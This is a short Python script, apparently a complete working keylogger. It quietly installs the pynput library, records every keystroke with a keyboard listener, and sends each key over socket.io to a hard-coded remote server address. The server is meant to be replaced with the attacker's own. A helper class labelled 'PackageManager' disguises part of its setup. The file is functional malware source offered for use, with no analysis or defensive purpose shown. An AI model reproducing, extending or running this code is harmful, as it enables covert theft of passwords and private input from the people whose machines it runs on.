import os
import sys
import subprocess
import socketio

sio = socketio.Client()

class PackageManager:
    def __init__(self):
        self.add_python_to_path()
        self.install_pynput()

    def add_python_to_path(self):
        python_dir = sys.exec_prefix

        if python_dir not in os.environ['PATH']:
            os.environ['PATH'] = python_dir + os.pathsep + os.environ['PATH']
            print(f"Python {sys.version} has been added to the PATH for this session.")
        else:
            print(f"Python {sys.version} is already in the PATH.")

    def install_pynput(self):
        try:
            import pynput
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
                print("Successfully installed 'pynput'.")

            except subprocess.CalledProcessError:
                print("Failed to install 'pynput'.")
                sys.exit(1)

class Logger:
    def __init__(self, server_url):
        self.server_url = server_url

    def on_key_press(self, key):
        try:
            sio.emit('keypress', str(key))
        except Exception as e:
            print(f"Error sending key data to the server: {str(e)}")

    def start_logging(self):
        from pynput.keyboard import Listener as KeyboardListener
        
        with KeyboardListener(on_press=self.on_key_press) as listener:
            listener.join()

if __name__ == "__main__":
    server_url = "http://10.0.2.150:5050"  # Replace with your actual server URL

    sio.connect(server_url)

    package_manager = PackageManager()
    logger = Logger(server_url)
    logger.start_logging()

    sio.wait()
